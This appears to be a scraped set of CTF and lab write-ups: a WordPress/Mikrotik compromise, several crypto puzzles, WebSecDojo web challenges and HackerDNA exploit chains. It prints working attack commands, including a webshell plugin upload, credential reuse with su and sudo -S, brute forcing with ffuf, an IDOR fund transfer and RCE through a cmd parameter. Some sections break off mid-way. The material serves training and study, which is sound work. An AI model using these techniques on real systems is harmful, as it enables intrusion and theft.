content: 🛡️ Extensive Technical Writeup: blog.nexatech.hdna Author: spawn2pwn Date: April 19, 2026 Target: WordPress 6.5.4 / Mikrotik HttpProxy Category: Web Exploitation, Network Bypass, Privilege Escalation
title: 🛡️ Extensive Technical Writeup: blog.nexatech.hdna

content: 1. Project Overview This security audit aims to test the resilience of NexaTech infrastructure which involves a combination of WordPress web applications and network traffic management using Mikrotik proxies. The main focus is testing the effectiveness of Layer 7 filters and isolation between users in the Linux operating system.
title: 🛡️ Extensive Technical Writeup: blog.nexatech.hdna

content: 2. Phase I: Reconnaissance & Network Bypass
title: 🛡️ Extensive Technical Writeup: blog.nexatech.hdna

content: 2.1 Identification of Network Filters In the initial stages, standard access to wp-login.php and other administrative areas is restricted by Mikrotik HttpProxy. The server response returns status code 403 Forbidden with administrator information supernova .
title: 🛡️ Extensive Technical Writeup: blog.nexatech.hdna

content: 2.2 Proxy Bypass Technique Analysis of proxy behavior shows weaknesses in URL parsing. By using the Path Suffix Appending technique, proxy filters can be fooled. Normal Request: http://blog.nexatech.hdna/wp-login.php -> 403 Forbidden Bypassed Request: http://blog.nexatech.hdna/wp-login.php/* -> 200 OK This bypass works because the proxy thinks the request is directed to a sub-directory or static file, even though the WordPress backend is still processing the main PHP file.
title: 🛡️ Extensive Technical Writeup: blog.nexatech.hdna

content: 3. Phase II: Initial Access & Exploitation
title: 🛡️ Extensive Technical Writeup: blog.nexatech.hdna

content: 3.1 Gaining Administrator Access Using a vulnerability in the Ultimate Member (v2.6.6) plugin (CVE-2023-3460), manipulation of user metadata during registration was carried out. This allows creating an account with the role Administrator via metadata protection bypass.
title: 🛡️ Extensive Technical Writeup: blog.nexatech.hdna

content: 3.2 Weaponization (Web Shell Upload) After gaining access to the WordPress Dashboard (via proxy bypass), the next step is to embed persistent access. Since the theme/plugin editor is disabled, the attack is carried out using the Plugin Sideloading method. Steps: Create a local plugin directory named shadow-core . Insert the PHP webshell ( spawn2pwn-webshell.php ) into the directory. Compressing the directory to shadow-core.zip . Upload via curl by including a security token (Nonce). curl -v -b cookies.txt -F "pluginzip=@shadow-core.zip;type=application/zip" \ "http://blog.nexatech.hdna/wp-admin/update.php?action=upload-plugin/*" Activation of the plugin is carried out to execute the script, providing Remote Code Execution (RCE) access as user www-data .
title: 🛡️ Extensive Technical Writeup: blog.nexatech.hdna

content: 4. Phase III: Enumeration & Lateral Movement
title: 🛡️ Extensive Technical Writeup: blog.nexatech.hdna

content: 4.1 Post-Exploitation Enumeration In the user context www-data , inspection of sensitive configuration files is performed. Found file /var/www/html/wp-config.php containing plaintext credentials: DB_USER: nexatech * DB_PASS: UzhApBj2hc28vaj ### 4.2 Data Exfiltration (MySQL) Extract information from table wp_users to confirm system user: mysql -u nexatech -p'UzhApBj2hc28vaj' -e "USE nexatech; SELECT user_login FROM wp_users;"
title: 🛡️ Extensive Technical Writeup: blog.nexatech.hdna

content: 4.3 Lateral Movement (User Pivot) It was discovered that there is a Linux system user named nexatech . Based on the Password Reuse assumption, an attempt is made to move users (pivoting). Due to the limitations of a non-interactive shell, a Python wrapper is used to handle authentication: python3 -c 'import os; os.system("echo UzhApBj2hc28vaj | su nexatech -c \"whoami; id\"")' Result: Successfully gained access as uid=1000(nexatech) . User flags are found in /home/flag-user.txt .
title: 🛡️ Extensive Technical Writeup: blog.nexatech.hdna

content: 5. Phase IV: Privilege Escalation to Root
title: 🛡️ Extensive Technical Writeup: blog.nexatech.hdna

content: 5.1 Sudoers Analysis Analysis of sudo privileges shows that user nexatech has an entry in the sudoers file. However, execution is hindered by the absence of a PTY (Pseudo-Terminal).
title: 🛡️ Extensive Technical Writeup: blog.nexatech.hdna

content: 5.2 The “Sudo-Stdin” Attack To bypass the PTY limitation, the -S (Standard Input) parameter in the sudo binary is used. This technique allows passing passwords directly through pipes in a single encapsulated command line. Final Exploit Chain: python3 -c 'import os; os.system("echo UzhApBj2hc28vaj | su nexatech -c \"echo UzhApBj2hc28vaj | sudo -S cat /root/flag-root.txt\"")'
title: 🛡️ Extensive Technical Writeup: blog.nexatech.hdna

content: 5.3 Root Capture The command successfully executes a read access with highest privileges (Superuser), generating the contents of the root flag.
title: 🛡️ Extensive Technical Writeup: blog.nexatech.hdna

content: 6. Flags Collected Flag Type Location Value User Flags /home/flag-user.txt bdeed944-1b89-4d96-b1cd-a838b1ebf948 Root Flag /root/flag-root.txt 3bf64c05-920b-41f2-a4d8-694064bc3f3c
title: 🛡️ Extensive Technical Writeup: blog.nexatech.hdna

content: 7. Conclusion & Recommendations
title: 🛡️ Extensive Technical Writeup: blog.nexatech.hdna

content: 7.1 Security Gaps Inadequate Proxy Filtering: Mikrotik filters are easily bypassed with simple URL character manipulation. Plugin Vulnerability: Using a vulnerable version of the plugin (Ultimate Member 2.6.6) provides an easy privilege escalation path. Credential Overlap: Using the same password for database services and system accounts speeds up the lateral movement process. Permissive Sudoers: Granting sudo permissions to system users without valid MFA or terminal supervision increases the risk of automated exploitation.
title: 🛡️ Extensive Technical Writeup: blog.nexatech.hdna

content: 7.2 Mitigation Steps Implement WAF: Uses a more sophisticated Web Application Firewall than just a static HTTP proxy. Patch Management: Perform regular updates to WordPress core and all plugins. Zero Trust Credentials: Ensures each service (DB, System, Web) has unique and complex credentials. Secure Sudo Configuration: Uses NOPASSWD only for absolutely necessary binaries and has no functions for reading files or executing shells (referring to GTFOBins). Disclaimer: This report was prepared for educational purposes and professional documentation in a legal lab environment.
title: 🛡️ Extensive Technical Writeup: blog.nexatech.hdna

content: Intercepted elliptic curve Diffie-Hellman parameters were recovered. Can you break the discrete logarithm on this flawed curve and decrypt the secret transmission? TL;DR Kurva Patah is a cryptography challenge featuring a vulnerable Elliptic Curve Diffie-Hellman (ECDH) implementation. Because the curve’s group order is exceptionally small (n=10092n = 10092n=10092), the Elliptic Curve Discrete Logarithm Problem (ECDLP) is trivial to solve via direct point multiplication brute force. Once the target’s private key ddd is recovered, the AES-128-CBC key is derived from SHA-256(str(d))[:16]\text{SHA-256}(\text{str}(d))[:16]SHA-256(str(d))[:16], decrypting the flag ciphertext.
title: Kurva Patah

content: Intercepted Parameters The challenge provides intercepted transmission parameters in intercept.json: Weierstrass Curve: y2≡x3+x+3(mod10007)y^2 \equiv x^3 + x + 3 \pmod{10007}y2≡x3+x+3(mod10007) Field Modulus (ppp): 100071000710007 Curve Coefficient (aaa): 111 Generator Point (GGG): (16,2698)(16, 2698)(16,2698) Group Order (nnn): 100921009210092 Target Public Key (QQQ): (1121,8336)(1121, 8336)(1121,8336) Ciphertext & IV: AES-CBC parameters hex-encoded
title: Kurva Patah

content: Cryptographic Analysis In ECDH key exchange, a party’s public key QQQ is computed by scalar multiplication of the generator point GGG with the private key ddd: Q=d⋅GQ = d \cdot GQ=d⋅G The security of ECDH depends strictly on the hardness of the Elliptic Curve Discrete Logarithm Problem (ECDLP): given points GGG and QQQ, finding the scalar ddd should be computationally intractable.
title: Kurva Patah

content: The Flaw: Tiny Group Order Here, the order of the base point GGG is tiny: n=10092n = 10092n=10092 Because d∈[1,n]d \in [1, n]d∈[1,n], the total keyspace is only 10,09210,09210,092 possible values. Instead of requiring complex Pohlig-Hellman or Baby-step Giant-step algorithms, we can simply evaluate: 1G,2G,3G,…,nG1G, 2G, 3G, \dots, nG1G,2G,3G,…,nG until kG=QkG = QkG=Q.
title: Kurva Patah

content: Step-by-Step Resolution
title: Kurva Patah

content: 1. Brute-Forcing the Discrete Logarithm Iterating scalar multiplications on the curve: def ec_add(P, Q, p, a): if P is None: return Q if Q is None: return P x1, y1 = P x2, y2 = Q if x1 == x2 and (y1 + y2) % p == 0: return None if P != Q: slope = ((y2 - y1) * pow((x2 - x1) % p, -1, p)) % p else: slope = ((3 * x1 * x1 + a) * pow((2 * y1) % p, -1, p)) % p x3 = (slope * slope - x1 - x2) % p y3 = (slope * (x1 - x3) - y1) % p return (x3, y3) def ec_mul(k, P, p, a): res = None curr = P while k: if k & 1: res = ec_add(res, curr, p, a) curr = ec_add(curr, curr, p, a) k >>= 1 return res # Search for d for d in range(1, order + 1): if ec_mul(d, G, p, a) == Q: print(f"Recovered private key: {d}") break Output: Recovered private key: 1826 The target’s private key is 1826.
title: Kurva Patah

content: 2. Key Derivation & AES-128-CBC Decryption The AES key derivation function converts the scalar integer into an ASCII string, hashes it with SHA-256, and extracts the first 16 bytes: key = sha256(str(1826).encode()).digest()[:16] Using the recovered key and the provided IV, we decrypt the ciphertext under AES-128-CBC and remove PKCS#7 padding: from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes cipher = Cipher(algorithms.AES(key), modes.CBC(iv)) decryptor = cipher.decryptor() plaintext = decryptor.update(ciphertext) + decryptor.finalize() Output: WMS{sm00th_0rd3r_p0hl1g_h3llm4n_dl0g}
title: Kurva Patah

content: Flag WMS{sm00th_0rd3r_p0hl1g_h3llm4n_dl0g}
title: Kurva Patah

content: Security Takeaway The underlying symmetric encryption (AES-128) was sound, but the entire cryptosystem failed because of insecure elliptic curve parameters. Elliptic curves must always be chosen with sufficiently large prime orders (e.g., NIST P-256 or Curve25519) to prevent discrete log recovery attacks.
title: Kurva Patah

content: A multi-layered cryptographic pipeline was used to obscure a confidential message. Can you reverse the transformations in the exact inverse order to recover the flag? TL;DR Sandi Berlapis is a cryptography challenge featuring a four-stage sequential encoding pipeline: XOR with a repeating key (PH4NT0M), byte reversal, Base64 encoding, and Hex encoding. Because all four transformations are deterministic and completely reversible, inverting the operations in reverse order (Hex Decode →\rightarrow→ Base64 Decode →\rightarrow→ Byte Reversal →\rightarrow→ XOR) recovers the original flag.
title: Sandi Berlapis

content: Encoder Mechanism Analysis The challenge provides the encryption script encoder.py: import base64 _K = bytes([0x50, 0x48, 0x34, 0x4E, 0x54, 0x30, 0x4D]) # b"PH4NT0M" def phase_alpha(data: bytes, key: bytes) -> bytes: return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)]) def phase_beta(data: bytes) -> bytes: return data[::-1] def phase_gamma(data: bytes) -> bytes: return base64.b64encode(data) def phase_delta(data: bytes) -> str: return data.hex()
title: Sandi Berlapis

content: Transformation Pipeline Phase Alpha (XOR): Plaintext bytes are XORed with key _K = b"PH4NT0M". Phase Beta (Reversal): The resulting byte sequence is reversed end-to-end (data[::-1]). Phase Gamma (Base64): The reversed bytes are encoded using standard Base64. Phase Delta (Hex): The Base64 ASCII bytes are converted into a hexadecimal representation. We are given the ciphertext in encoded_message.txt: 4d454d6d665541385a4342764a6e31514f6d4153567a702f5548677a49774d4c4b676336597a51454f44566e4251633d
title: Sandi Berlapis

content: Decryption Strategy Because symmetric XOR and encoding layers are inherently bi-directional, decryption simply executes the inverse functions in reverse sequence: Plaintext=XOR(Reverse(Base64Decode(HexDecode(C))),K)\text{Plaintext} = \text{XOR}\Big(\text{Reverse}\big(\text{Base64Decode}(\text{HexDecode}(C))\big), K\Big)Plaintext=XOR(Reverse(Base64Decode(HexDecode(C))),K) Step 1: Decode from Hex to raw Base64 bytes. Step 2: Decode the Base64 bytes to raw ciphertext. Step 3: Reverse the byte sequence (data[::-1]). Step 4: XOR each byte with the repeating key b"PH4NT0M".
title: Sandi Berlapis

content: Automated Solver We construct a Python solver script: #!/usr/bin/env python3 import base64 CIPHERTEXT_HEX = "4d454d6d665541385a4342764a6e31514f6d4153567a702f5548677a49774d4c4b676336597a51454f44566e4251633d" KEY = b"PH4NT0M" # Step 1: Hex decode b64_bytes = bytes.fromhex(CIPHERTEXT_HEX) # Step 2: Base64 decode reversed_bytes = base64.b64decode(b64_bytes) # Step 3: Reverse bytes xored_bytes = reversed_bytes[::-1] # Step 4: XOR with repeating key plaintext = bytes([b ^ KEY[i % len(KEY)] for i, b in enumerate(xored_bytes)]) print("[+] Decrypted Flag:", plaintext.decode()) Running the script outputs: [+] Decrypted Flag: WMS{l4y3r3d_3nc0d1ng_0rd3r_m4tt3rs}
title: Sandi Berlapis

content: Flag WMS{l4y3r3d_3nc0d1ng_0rd3r_m4tt3rs}
title: Sandi Berlapis

content: Security Takeaway Encoding schemes (such as Hex and Base64) provide data representation, not cryptographic secrecy. Furthermore, stacking reversible encodings with a static XOR key offers security through obscurity, which can be immediately dismantled once the transformation sequence is identified.
title: Sandi Berlapis

content: TL;DR picoCTF 2019 – Cryptography: 13 is a crypto challenge from picoCTF. Cryptography can be easy, do you know what ROT13 is?
title: picoCTF 2019 – Cryptography: 13

content: Description Cryptography can be easy, do you know what ROT13 is? cvpbPGS{abg_gbb_onq_bs_n_ceboyrz} Hint This can be solved online if you don't want to do it by hand!
title: picoCTF 2019 – Cryptography: 13

content: Objective The objective of this challenge is to decode a string encrypted using the ROT13 cipher and recover the flag.
title: picoCTF 2019 – Cryptography: 13

content: Analysis ROT13 (Rotate by 13) is a simple substitution cipher where: Each letter is shifted 13 positions in the alphabet Applying ROT13 twice returns the original text Example: a ↔ n b ↔ o c ↔ p The given ciphertext: cvpbPGS{abg_gbb_onq_bs_n_ceboyrz}
title: picoCTF 2019 – Cryptography: 13

content: Approach We can decode the string using the tr command in Linux: echo "cvpbPGS{abg_gbb_onq_bs_n_ceboyrz}" | tr 'A-MN-Za-mn-z' 'N-ZA-Mn-za-m'
title: picoCTF 2019 – Cryptography: 13

content: TL;DR picoCTF 2019 – Cryptography: The Numbers is a crypto challenge from picoCTF. The numbers… what do they mean? numbers.png
title: picoCTF 2019 – Cryptography: The Numbers

content: Description The numbers… what do they mean? numbers.png Hint The flag is in the format PICOCTF{}
title: picoCTF 2019 – Cryptography: The Numbers

content: Objective The objective of this challenge is to decode a sequence of numbers into readable text and recover the flag.
title: picoCTF 2019 – Cryptography: The Numbers

content: Analysis The image contains the following sequence: 16 9 3 15 3 20 6 { 20 8 5 14 21 13 2 5 18 19 13 1 19 15 14 } This strongly suggests the use of the A1Z26 cipher, where: A = 1 B = 2 C = 3 … Z = 26 Each number corresponds to a letter of the alphabet.
title: picoCTF 2019 – Cryptography: The Numbers

content: Approach We decode each number into its corresponding letter: 16 → p 9 → i 3 → c 15 → o 3 → c 20 → t 6 → f So the prefix becomes: picoctf
title: picoCTF 2019 – Cryptography: The Numbers

content: Automation (Optional) You can automate the decoding using a Python script: def decode_a1z26(cipher_text): result = [] for token in cipher_text.split(): if token.isdigit(): num = int(token) if 1 <= num <= 26: result.append(chr(num + 96)) else: result.append(token) return ''.join(result) cipher = "16 9 3 15 3 20 6 { 20 8 5 14 21 13 2 5 18 19 13 1 19 15 14 }" print(decode_a1z26(cipher))
title: picoCTF 2019 – Cryptography: The Numbers

content: TL;DR picoCTF 2019 – General Skills: 2warm is a general skills challenge from picoCTF. Can you convert the number 42 (base 10) to binary (base 2)?
title: picoCTF 2019 – General Skills: 2warm

content: Description Can you convert the number 42 (base 10) to binary (base 2)? Hint Submit your answer in our competition's flag format. For example, if your answer was '11111', you would submit 'picoCTF{11111}' as the flag.
title: picoCTF 2019 – General Skills: 2warm

content: Analysis This challenge tests a fundamental concept in computer science: number base conversion, specifically converting a decimal number (base 10) into its binary representation (base 2). The given value is: 42 (base 10) The task is to determine its equivalent in binary form.
title: picoCTF 2019 – General Skills: 2warm

content: Solution
title: picoCTF 2019 – General Skills: 2warm

content: Method 1: Using bc The bc (Basic Calculator) utility in Linux can perform base conversions. Command: echo "obase=2; 42" | bc Output: 101010
title: picoCTF 2019 – General Skills: 2warm

content: Method 2: Using Python An alternative approach is to use Python’s built-in conversion function: python3 -c "print(bin(42)[2:])" Output: 101010
title: picoCTF 2019 – General Skills: 2warm

content: Method 3: Manual Conversion The conversion can also be performed manually by repeatedly dividing the number by 2 and recording the remainders: Division Quotient Remainder 42 ÷ 2 21 0 21 ÷ 2 10 1 10 ÷ 2 5 0 5 ÷ 2 2 1 2 ÷ 2 1 0 1 ÷ 2 0 1 Reading the remainders from bottom to top yields: 101010
title: picoCTF 2019 – General Skills: 2warm

content: Flag picoCTF{101010}
title: picoCTF 2019 – General Skills: 2warm

title: picoCTF 2019 – General Skills: First Grep

content: Objectives The goal of this challenge is to efficiently locate a hidden flag inside a large file without manually inspecting its contents.
title: picoCTF 2019 – General Skills: First Grep

content: Analysis The provided file contains a large amount of seemingly random and unreadable data. Viewing it directly using: cat file produces a long stream of characters, making manual inspection practical. This suggests that the file may contain embedded readable strings among binary or obfuscated data.
title: picoCTF 2019 – General Skills: First Grep

content: Approach To extract readable content from the file, the strings utility can be used. This tool scans binary data and outputs sequences of printable characters. strings file However, since the output is still quite large, we refine the process by filtering only the lines that match the expected flag format using grep . The flag format for picoCTF is typically: picoCTF{...} Thus, we use the following command: strings file | grep -o "picoCTF{[^}]*}"
title: picoCTF 2019 – General Skills: First Grep

content: Explanation strings file extracts readable strings from the file. grep -o ensures that only the matching portion is displayed. ___FL0X___]*} is a regular expression that: Matches the prefix picoCTF{ * Captures any characters except } until the closing brace is found
title: picoCTF 2019 – General Skills: First Grep

content: Objective The objective of this challenge is to convert a hexadecimal (base 16) number into its decimal (base 10) equivalent.

content: TL;DR City (Vault) is a web challenge from WebSecDojo. This challenge tests the ability to analyze HTTP protocols, manipulate headers, understand client-side logic (JavaScript), and brute forcing techniques in multilevel authentication forms.
title: City (Vault)

content: Challenge Overview This challenge tests the ability to analyze HTTP protocols, manipulate headers, understand client-side logic (JavaScript), and brute forcing techniques in multilevel authentication forms.
title: City (Vault)

content: Step 1: Reconnaissance (HTTP Method) Perform an initial check on the /vault/ endpoint: curl https://websecdojo.com/vault/ Found a hint in the HTML code: Don’t get a HEAD of yourself. The term aHEAD refers to the HTTP method HEAD. Perform header inspection using these methods: curl -I https://websecdojo.com/vault/ Suspicious header output: banker-agent-access: You need to be Agent33
title: City (Vault)

content: Step 2: User-Agent Spoofing Based on the instructions in Step 1, the server validates the identity via the User-Agent header. Change User-Agent to Agent33 : curl -A "Agent33" https://websecdojo.com/vault/ The response changes to: Identified banker Agent33. Please provide a secret cookie.
title: City (Vault)

content: Step 3: Analyze Cookie Logic At this point, a new JavaScript file is loaded at the bottom of the HTML: static/js/cookie.js . Check the contents of the file: curl https://websecdojo.com/vault/static/js/cookie.js Cookie creation logic found: cookie_value = getCookie("admins"); if(cookie_value == btoa(CryptoJS.MD5("true").toString())){ ... } Calculate cookie value manually: MD5(“true”): b326b5062b2f0e69046810717534cb09 2. Base64(MD5): YjMyNmI1MDYyYjJmMGU2OTA0NjgxMDcxNzUzNGNiMDk= —
title: City (Vault)

content: Step 4: Access Phase 1 Send a request with the User-Agent and Cookie that has been created: curl -A "Agent33" --cookie "admins=YjMyNmI1MDYyYjJmMGU2OTA0NjgxMDcxNzUzNGNiMDk=" https://websecdojo.com/vault/ The response indicates the first phase is complete: Login phase 1 completed. The page now displays the POST form for password input.
title: City (Vault)

content: Step 5: Brute Force Passwords Use ffuf to brute force the password parameter using wordlist rockyou.txt . Filter responses containing failure messages from Phase 1: ffuf -u https://websecdojo.com/vault/ -X POST \ -H "User-Agent: Agent33" \ -H "Cookie: admins=YjMyNmI1MDYyYjJmMGU2OTA0NjgxMDcxNzUzNGNiMDk=" \ -d "password=FUZZ" \ -w /usr/share/wordlists/rockyou.txt \ -fr "Login phase 1 completed." Password identification results that provide different responses (Size 0): rambo * catsrule —
title: City (Vault)

content: Step 6: Extracting Access Code Test the found password using curl and check the response header ( -i ): curl -i -X POST -A "Agent33" \ --cookie "admins=YjMyNmI1MDYyYjJmMGU2OTA0NjgxMDcxNzUzNGNiMDk=" \ -d "password=catsrule" \ https://websecdojo.com/vault/ Found a new header containing the access code: bank-access-code: 1573!
title: City (Vault)

content: Step 7: Final Authentication (The Flag) Use the access code 1573! as the final password to open the safe: curl -X POST -A "Agent33" \ --cookie "admins=YjMyNmI1MDYyYjJmMGU2OTA0NjgxMDcxNzUzNGNiMDk=" \ -d "password=1573!" \ https://websecdojo.com/vault/ Final response: <h2> <b>Hamu bank login</b> <br> Congrats! Flag is: flag#B4nk5Ar3c00l! </h2>
title: City (Vault)

content: Final Flags flag#B4nk5Ar3c00l!
title: City (Vault)

content: TL;DR Portal is a web challenge from WebSecDojo. This challenge involves a web application with multiple vulnerabilities. The goal is to obtain three flags by analyzing exposed endpoints, client-side JavaScript, and leaked source code.
title: Portal

content: Challenge Overview This challenge involves a web application with multiple vulnerabilities. The goal is to obtain three flags by analyzing exposed endpoints, client-side JavaScript, and leaked source code.
title: Portal

content: Step 1: Reconnaissance Perform directory fuzzing on the target: ffuf -u https://websecdojo.com/portal/FUZZ -w /usr/share/wordlists/dirb/common.txt Discovered endpoints: /portal/ * /portal/login * /portal/dashboard * /portal/robots.txt Retrieve the robots file: curl https://websecdojo.com/portal/robots.txt Output: User-Agent: * Disallow: /customers
title: Portal

content: Step 2: Analyze Hidden Endpoints Access the /customers endpoint: curl https://websecdojo.com/portal/customers Response: This suggests a structured customer ID format.
title: Portal

content: Step 3: Customer Enumeration Test path-based access: curl https://websecdojo.com/portal/customers/0001 curl https://websecdojo.com/portal/customers/0002 curl https://websecdojo.com/portal/customers/0003 Result: Valid customer ID identified: 0002
title: Portal

content: Step 4: Analyze JavaScript (Flag 1) Retrieve the JavaScript file: curl https://websecdojo.com/portal/script.js The script contains: A custom character mapping Conversion to hexadecimal Conversion to ASCII Execution via eval() Two variables are present: output (decoy) hidden (actual payload) Decode the hidden variable using Python: python3 - << 'EOF' mapping = { 'q':"0",'w':"1",'e':"2",'r':"3",'t':"4",'y':"5", 'u':"6",'i':"7",'o':"8",'p':"9", 'A':"a",'S':"b",'D':"c",'F':"d",'G':"e",'H':"f" } s="uuuDuwuieryruHieieiptuuHieteuyupuGuitwuGuGuHipupuGui" h="".join(mapping[c] for c in s if c in mapping) print(bytes.fromhex(h).decode()) EOF Output: flag#SorryForBeingAnnoying Flag 1: flag#SorryForBeingAnnoying
title: Portal

content: Step 5: Authentication Login using the discovered credentials: curl -X POST https://websecdojo.com/portal/login \ -d "username=0002&password=flag#SorryForBeingAnnoying" -i The response includes a session cookie and a redirect to /portal/dashboard .
title: Portal

content: Step 6: Access Dashboard (Flag 2) Use the session cookie to access the dashboard: curl https://websecdojo.com/portal/dashboard \ -H "Cookie: session=<SESSION_VALUE>" Response contains: Welcome, Customer #0002 (flag#SecondFlagOfTheChallenge) Flag 2: flag#SecondFlagOfTheChallenge
title: Portal

content: Step 7: Download Source Code Download the project archive: curl -O https://websecdojo.com/portal/project.zip Extract the archive: unzip project.zip Directory structure: project/ ├── main.py └── .git/
title: Portal

content: Step 8: Analyze Git Repository (Flag 3) Navigate to the project directory: cd project Inspect commit history: git --no-pager log -p A commit shows that secrets were removed: -S3_BUCKET_NAME = "flag#SoCallMeMaybe" -AWS_ACCESS_KEY = "flag#SoCallMeMaybe" -AWS_SECRET_KEY = "flag#SoCallMeMaybe" The initial commit contains the original values: S3_BUCKET_NAME = "flag#SoCallMeMaybe" AWS_ACCESS_KEY = "flag#SoCallMeMaybe" AWS_SECRET_KEY = "flag#SoCallMeMaybe" Flag 3: flag#SoCallMeMaybe
title: Portal

content: Final Flags flag#SorryForBeingAnnoying flag#SecondFlagOfTheChallenge flag#SoCallMeMaybe
title: Portal

content: TL;DR The Bank is a web challenge from WebSecDojo. This challenge focuses on modern banking applications that have vulnerabilities on the API side. The goal is to exploit weak authorization mechanisms to access other users’ data and obtain flags.
title: The Bank

content: Challenge Overview This challenge focuses on modern banking applications that have vulnerabilities on the API side. The goal is to exploit weak authorization mechanisms to access other users’ data and obtain flags.
title: The Bank

content: Step 1: Reconnaissance & Enumeration Perform an initial check on the dashboard after logging in. It can be seen that the URL uses the user_id parameter: https://websecdojo.com/thebank/dashboard.php?user_id=0 Use curl To view HTML structure and find API references: curl -s "https://websecdojo.com/thebank/dashboard.php?user_id=0" \ -H "Cookie: PHPSESSID=<SESSION_ID>" Found a JavaScript block that makes a request to api.php : fetch('api.php?user_id=' + userId, { method: 'POST', body: formData })
title: The Bank

content: Step 2: API Fuzzing (BOLA/IDOR) Since the application determines the user’s identity via the user_id parameter in the URL, we can perform fuzzing to find another valid user ID using ffuf . Filter response size 19 (size of {"status":"failed"} ): ffuf -u "https://websecdojo.com/thebank/api.php?user_id=FUZZ" \ -w <(seq 1 100) \ -H "Cookie: PHPSESSID=<SESSION_ID>" \ -fs 19 -c Output: 10 [Status: 200, Size: 20] 11 [Status: 200, Size: 20] Two valid IDs were identified: 10 (John Doe) and 11 (Bob Doe).
title: The Bank

content: Step 3: Unauthorized Data Access Access another user’s dashboard (ID 11) To view their balance and transaction history: curl -s "https://websecdojo.com/thebank/dashboard.php?user_id=11" \ -H "Cookie: PHPSESSID=<SESSION_ID>" Results show a balance of $20,000. Even though the data is visible, the flag has not been found in the HTML body.
title: The Bank

content: Step 4: Exploiting API Logic Flaw Attempting to transfer funds from another user’s account (ID 11) to the attacker’s account ( admin_hacker ) by utilizing the user_id parameter which is not validated on the server side (Broken Object Level Authorization). Send request POST to the API impersonating user 11: curl -X POST "https://websecdojo.com/thebank/api.php?user_id=11" \ -H "Cookie: PHPSESSID=<SESSION_ID>" \ -d "recipient=admin_hacker&amount=20000&description=Give_me_the_flag" \ -i
title: The Bank

content: Step 5: Information Disclosure in Headers Analysis of the response from the server after performing the illegal transfer. The server returns a success status, and a flag is found hidden inside Custom HTTP Header: Response Headers: HTTP/2 200 date: Fri, 20 Mar 2026 15:52:29 GMT content-type: application/json x-flag: flag#Th@tWas3asyN0? ... {"status":"success"}
title: The Bank

content: Final Flags flag#Th@tWas3asyN0?
title: The Bank

content: TL;DR Broken Chain – CTF Writeup is a misc challenge from HackerDNA. This writeup provides a complete walkthrough and technical analysis.
title: Broken Chain – CTF Writeup

content: Overview The Broken Chain challenge demonstrates how multiple small vulnerabilities can be chained together to achieve full system compromise. The exploitation path includes a Zip Slip vulnerability, remote command execution, interaction with an internal backup service, credential disclosure, and finally privilege escalation via a misconfigured sudo rule allowing Vim execution as root. This write-up documents the full attack chain that ultimately results in retrieving the root flag.
title: Broken Chain – CTF Writeup

content: Initial Foothold – Zip Slip Vulnerability The target web application allowed users to upload compressed archives. During testing, it was discovered that the extraction process did not properly validate file paths inside the archive. This made the application vulnerable to Zip Slip, which allows attackers to write files outside the intended extraction directory using path traversal sequences such as: ../../app.py By crafting a malicious archive, it was possible to overwrite the Flask application’s source file ( app.py ).
title: Broken Chain – CTF Writeup

content: Remote Code Execution The malicious archive replaced the application logic with a version that allowed command execution through a query parameter. Commands could then be executed using: http://TARGET:8080/?cmd=<command> Examples: curl "http://TARGET:8080/?cmd=id" This confirmed Remote Command Execution (RCE).
title: Broken Chain – CTF Writeup

content: Enumeration System With command execution available, system enumeration was performed. One important discovery was an internal service running locally: 127.0.0.1:45678 Since it was only accessible locally, requests had to be proxied through the existing RCE. Examples: curl "http://TARGET:8080/?cmd=curl localhost:45678" The service returned a 404 , indicating that further endpoint discovery was required.
title: Broken Chain – CTF Writeup

content: Discovering the Backup Control Panel Further enumeration revealed an internal interface: /controlpanel This page displays a Backup Control Panel used for managing backup operations. content: TL;DR FortiPy – Full Exploitation Writeup is a misc challenge from HackerDNA. This challenge demonstrates a realistic multi-stage compromise involving web application exploitation, credential discovery, password cracking, and privilege escalation via a misconfigured sudo rule.
title: FortiPy – Full Exploitation Writeup

content: Overview This challenge demonstrates a realistic multi-stage compromise involving web application exploitation, credential discovery, password cracking, and privilege escalation via a misconfigured sudo rule. The attack chain progresses from a web application vulnerability to full system compromise by leveraging exposed configuration data and weak credential management practices.
title: FortiPy – Full Exploitation Writeup

content: Target Information Item Value Challenge FortiPy Category Web / Privilege Escalation Initial Access Web Application Final Goal Root Privilege
title: FortiPy – Full Exploitation Writeup

content: Attack Path Summary Server-Side Template Injection (SSTI) Leak Flask SECRET_KEY 3. Forge Admin Session Cookie Access Restricted Admin Endpoint Obtain SSH Credentials SSH Access as devadmin14 7. Database Credential Disclosure Extract Historical Credentials Crack Password Hash Lateral Movement to sqladmin 11. Abuse Misconfigured sudo Rule Root Privilege Escalation
title: FortiPy – Full Exploitation Writeup

content: 1. Server-Side Template Injection (SSTI) The web application contained a Server-Side Template Injection vulnerability that allowed execution of template expressions. This vulnerability allowed access to internal Flask objects and configuration variables. Using template introspection, the Flask SECRET_KEY was extracted. Example concept: {{config}} The extracted SECRET_KEY allowed forging authenticated session cookies.
title: FortiPy – Full Exploitation Writeup

content: 2. Forging an Admin Session Flask session cookies are signed using the SECRET_KEY . Once the key was obtained, it was possible to generate a valid administrative session cookie. Using a session forging tool, a new cookie was generated with administrative privileges. This granted access to restricted functionality within the application.
title: FortiPy – Full Exploitation Writeup

content: 3. Access to Hidden Administrative Endpoints After forging the session cookie, a previously restricted endpoint becomes accessible: /sshadmin This endpoint revealed SSH access credentials for a system user. Example access method: ssh devadmin14@<target-ip> Successful authentication granted shell access.
title: FortiPy – Full Exploitation Writeup

content: 4. Local Enumeration After gaining shell access as devadmin14 , system enumeration was performed. Key files discovered: db_config.ini This file contains database credentials: username=sqluser password=<redacted>
title: FortiPy – Full Exploitation Writeup

content: 5. Database Access The database server was not directly available via mysql , but further enumeration revealed a SQLite database. Discovery: find / -name "*.db" 2>/dev/null Result: /opt/database/database.db The database was opened using: sqlite3 /opt/database/database.db
title: FortiPy – Full Exploitation Writeup

content: 6. Database Enumeration Available tables: .tables Output: logs oldcreds transactions users The table oldcreds was particularly interesting as it appeared to contain historical credentials. Query: SELECT * FROM oldcreds; Output: testuser | 60849f5dba5a5fa98a180e25a1a9a2f2 dbtester | e704ce44d4b5ce635a7d797195024081 sqladmin | 6e70d06760276024943e0ec1339ef527 old_admin | 34e541102b00fea03c343ddc5872af98 These values appear to be MD5 password hashes.
title: FortiPy – Full Exploitation Writeup

